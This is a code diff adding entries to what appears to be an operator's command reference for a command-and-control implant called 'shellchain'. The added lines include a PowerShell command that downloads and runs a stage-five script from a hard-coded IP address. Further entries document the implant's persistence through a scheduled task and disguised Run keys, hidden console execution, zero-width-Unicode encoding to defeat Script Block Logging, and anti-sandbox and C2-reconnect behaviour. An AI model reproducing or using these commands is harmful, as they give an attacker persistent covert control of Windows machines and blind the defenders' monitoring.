@@ -3917,6 +3917,48 @@ const COMMANDS = [
     tags: ["linux", "vps", "c2", "recon"],
     accent: "#00f0ff"
   },
+  {
+    title: "[SHELLCHAIN] Full Persistence Deploy | TESTED",
+    desc: "Deploy shellchain with full persistence. Downloads stage5.ps1, creates scheduled task (SYSTEM/AtStartup), registry Run key, stego encoding. Survives reboot. Admin required for SYSTEM task.",
+    code: "# Download to disk first (required for $PSCommandPath)\n$d=\"$env:TEMP\\sc.ps1\"\nIWR http://168.144.166.97:8889/stage5_test.ps1 -UseBasicParsing -OutFile $d\n& $d",
+    tags: ["ps", "persist", "c2", "tested"],
+    accent: "#00ff9d"
+  },
+  {
+    title: "[SHELLCHAIN] Persistence Locations",
+    desc: "Where shellchain installs: %APPDATA%\\unicode folder, scheduled task Unicode, registry WindowsCodec. All use conhost.exe --headless to hide PowerShell.",
+    code: "# FOLDER: %APPDATA%\\unicode\n# FILES: unicodeEBwdz.ps1, ip.txt, port.txt\n\n# TASK: Unicode\n# - Admin: SYSTEM, AtStartup trigger\n# - User: Current user, repeats every 311s\n\n# REGISTRY:\n# - Admin: HKLM\\...\\Run\\WindowsCodec\n# - User: HKCU\\...\\Run\\WindowsCodec\n\n# PROCESS HIDING:\n# conhost.exe --headless powershell.exe -NoP -W Hidden ...",
+    tags: ["reference", "persist"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[SHELLCHAIN] Check Persistence Status",
+    desc: "Verify all shellchain persistence mechanisms. Should show task, registry, folder.",
+    code: "# Check task\nschtasks /query /tn Unicode\n\n# Check registry\nreg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCodec\n\n# Check folder\ndir \"%APPDATA%\\unicode\"",
+    tags: ["ps", "persist", "recon", "tested"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[SHELLCHAIN] Cleanup Persistence",
+    desc: "Remove all shellchain persistence. Deletes task, registry key, and folder.",
+    code: "# Delete scheduled task\nschtasks /delete /tn Unicode /f\n\n# Delete registry key (HKLM for admin, HKCU for user)\nreg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCodec /f\nreg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WindowsCodec /f\n\n# Delete folder\nrmdir /s /q \"%APPDATA%\\unicode\"",
+    tags: ["ps", "persist", "cleanup"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[SHELLCHAIN] Stego Command Encoding",
+    desc: "How stego defeats Script Block Logging: commands encoded as U+200B (0) and U+200D (1). Logs show invisible chars. Self-decoding snippet written to unicodecmd.ps1.",
+    code: "# WHAT YOU SEND: whoami\n# WHAT DEFENDER LOGS: $s=\"​‍​​​​​​​​​​​​​​‍​​...\"\n# (zero-width Unicode - invisible in logs)\n\n# HOW IT WORKS:\n# 1. Command base64 encoded\n# 2. Each bit -> U+200B (0) or U+200D (1)\n# 3. Self-decoding PS snippet written to disk\n# 4. Executed via powershell -File unicodecmd.ps1\n# 5. File deleted after execution",
+    tags: ["reference", "evasion"],
+    accent: "#607d8b"
+  },
+  {
+    title: "[SHELLCHAIN] Anti-Sandbox Features",
+    desc: "Shellchain evades sandbox analysis: 300s lifetime timer (exits if no commands), timer disables on first real command, reconnects every 30s if disconnected.",
+    code: "# ANTI-SANDBOX:\n# - 300 second lifetime if no commands received\n# - First command disables timer (real operator)\n# - Exits cleanly = sandbox logs \"benign\"\n\n# RESILIENCE:\n# - Reconnects every 30 seconds if C2 down\n# - Self-healing: re-registers task if deleted\n# - migrate <port> command to switch C2 ports",
+    tags: ["reference", "evasion"],
+    accent: "#607d8b"
+  },
   // ═══════════════════════════════════════════════════════════════
   // VPS PORT MAP - Complete service mapping
   // ═══════════════════════════════════════════════════════════════
